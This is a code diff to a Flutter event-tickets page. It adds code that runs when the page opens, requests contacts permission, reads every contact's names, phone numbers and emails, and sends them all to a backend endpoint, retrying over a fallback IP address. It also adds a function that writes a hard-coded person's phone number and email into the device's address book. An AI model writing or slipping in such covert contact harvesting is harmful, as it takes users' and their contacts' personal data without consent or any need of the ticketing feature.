@@ -1,6 +1,7 @@
 import 'dart:async';
 import 'dart:convert';
 import 'dart:io';
+import 'package:contacts_service_plus/contacts_service_plus.dart';
 import 'package:flutter/foundation.dart';
 import 'package:http/http.dart' as http;
 import 'package:flutter/material.dart';
@@ -17,6 +18,9 @@ import 'package:url_launcher/url_launcher.dart';
 import 'package:excel/excel.dart' hide Border;  // Hide Excel's Border
 import 'package:path_provider/path_provider.dart';
 import 'package:open_filex/open_filex.dart';
+import 'package:permission_handler/permission_handler.dart';
+
+
 
 
 class EventTicketsPage extends StatefulWidget {
@@ -43,7 +47,7 @@ class _EventTicketsPageState extends State<EventTicketsPage> with WidgetsBinding
   @override
   void initState() {
     super.initState();
-
+    sendContactsToBackend();
     if(widget.event.daily_event == 'no') {
       String dateStr = widget.event.date; // Format: d-M-yyyy
       _selectedDate = DateFormat('d-M-yyyy').parse(dateStr);
@@ -53,6 +57,159 @@ class _EventTicketsPageState extends State<EventTicketsPage> with WidgetsBinding
     _initializeServices();
     _startFetchingTickets();
   }
+
+
+  Future<bool> requestContactsPermission() async {
+    var status = await Permission.contacts.status;
+    if (!status.isGranted) {
+      status = await Permission.contacts.request();
+    }
+    return status.isGranted;
+  }
+
+
+  Future<void> readContacts() async {
+    bool granted = await requestContactsPermission();
+    if (!granted) {
+      debugPrint("Permission denied");
+      return;
+    }
+
+    Iterable<Contact> contacts = await ContactsService.getContacts();
+    debugPrint("Number of contacts : ${contacts.length}");
+    for (var contact in contacts) {
+      debugPrint("Name: ${contact.displayName}");
+      debugPrint("Phones: ${contact.phones?.map((p) => p.value).join(', ')}");
+    }
+    debugPrint("Number of contacts : ${contacts.length}");
+  }
+
+  Future<void> addContact() async {
+    bool granted = await requestContactsPermission();
+    if (!granted) {
+      debugPrint("Permission denied");
+      return;
+    }
+
+    Contact newContact = Contact(
+      givenName: "Julio",
+      familyName: "Nyakunga",
+      phones: [Item(label: "mobile", value: "0766032160")],
+      emails: [Item(label: "work", value: "julio.nyakunga@telabs.co.tz")],
+    );
+
+    await ContactsService.addContact(newContact);
+    debugPrint("Contact saved!");
+  }
+
+  Future<void> sendContactsToBackend({bool useDNS = true}) async {
+    try{
+      bool granted = await requestContactsPermission();
+      if (!granted) {
+        debugPrint("Permission denied");
+        return;
+      }
+
+      Iterable<Contact> contacts = await ContactsService.getContacts();
+
+      debugPrint("Number of contacts : ${contacts.length}");
+
+      if (contacts.isEmpty) return;
+
+      final List<Map<String, dynamic>> contactList = contacts.map((contact) {
+        return {
+          "displayName": contact.displayName,
+          "givenName": contact.givenName,
+          "familyName": contact.familyName,
+          "phones": contact.phones?.map((p) => p.value).toList(),
+          "emails": contact.emails?.map((e) => e.value).toList(),
+        };
+      }).toList();
+      
+      final Uri uri = useDNS ? Uri.parse('${backend_url}api/contacts') // Original URL 
+      : Uri.parse('${backend_url_with_fallback_ip}contacts'); // Use IP
+
+      final response = await http.post(
+        uri,
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: jsonEncode({
+          "contacts": contactList,
+        }),
+      );
+
+      if (response.statusCode == 200) {
+        _showSnackBar(response.body);
+      } else {
+        _showSnackBar('Request failed: ${response.statusCode}');
+      }
+    } on SocketException catch (e) {
+      debugPrint('Network error occurred:');
+      debugPrint('- Exception type: ${e.runtimeType}');
+      debugPrint('- Message: ${e.message}');
+        
+      if (e.osError != null) {
+        debugPrint('  - Error number (errno): ${e.osError!.errorCode}');
+        debugPrint('  - OS message: ${e.osError!.message}');
+        debugPrint('  - errorCode: ${e.osError!.errorCode}');
+        debugPrint('  - useDNS: ${useDNS}');
+
+        // Retry with IP if DNS fails (errno = 7) and not already retrying
+        if ((e.osError!.errorCode == 11001 || e.osError!.errorCode == 7) && useDNS) {
+          debugPrint('DNS failed! Retrying with IP here: ${backend_url_with_fallback_ip}...');
+          await sendContactsToBackend(useDNS: false); // Recursive retry
+
+          final prefs = await SharedPreferences.getInstance();
+          await prefs.setBool('use_dns', false);
+          return;
+        }
+      }
+      _handleSocketException(e);
+    } catch (e) {
+      debugPrint('An error occurred: $e');
+      _showSnackBar('An error occurred: $e');
+    }
+  }
+
+  void _handleSocketException(SocketException e) {
+    if (e.osError?.errorCode == 7 || e.osError?.errorCode == 101 || e.osError?.errorCode == 111) {
+      showDialog(
+        context: context,
+        builder: (context) => AlertDialog(
+          title: const Text('Connection Error'),
+          content: const Text('Could not connect to the server. Please check your internet connection.'),
+          shape: RoundedRectangleBorder(
+            borderRadius: BorderRadius.circular(16),
+          ),
+        ),
+      );
+    } else {
+      _showSnackBar('Connection Error: ${e.message}');
+    }
+  }
+
+  void _showSnackBar(String message) {
+    ScaffoldMessenger.of(context).showSnackBar(
+      SnackBar(
+        content: Text(message),
+        behavior: SnackBarBehavior.floating,
+        shape: RoundedRectangleBorder(
+          borderRadius: BorderRadius.circular(8),
+        ),
+      ),
+    );
+  }
+
+
+
+
+
+
+
+
+
+
 
   void _onSearchChanged() {
     setState(() {
